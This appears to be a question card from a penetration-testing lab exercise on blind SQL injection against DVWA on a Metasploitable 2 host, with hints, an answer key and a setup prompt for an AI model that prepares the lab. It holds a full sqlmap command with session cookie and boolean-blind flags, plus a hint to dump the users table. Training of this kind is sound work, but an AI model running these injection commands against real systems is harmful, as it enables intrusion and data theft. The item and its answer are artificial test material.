# Q087 — DVWA Blind SQLi (sqlmap)

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Run sqlmap against DVWA blind SQLi page (`vulnerabilities/sqli_blind/`). Provide flag combination needed.

---

## 🎯 Flag Format

```
flags=<sqlmap-flags>
```

Example: `flags=--technique=B --batch`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-T users --dump --technique=B`
</details>

<details>
<summary>Hint 2</summary>

Boolean-based blind = `B`.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie='PHPSESSID=X; security=low' --technique=B --batch
```

Boolean blind succeeds.

**Answer:** `flags=--technique=B --batch`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q087:
1. Same as Q067: DVWA up, security=low, PHPSESSID available.
2. The blind SQLi page /dvwa/vulnerabilities/sqli_blind/ reachable.

Report back: "Lab ready for Q087 — DVWA blind SQLi page reachable, security=low".
```
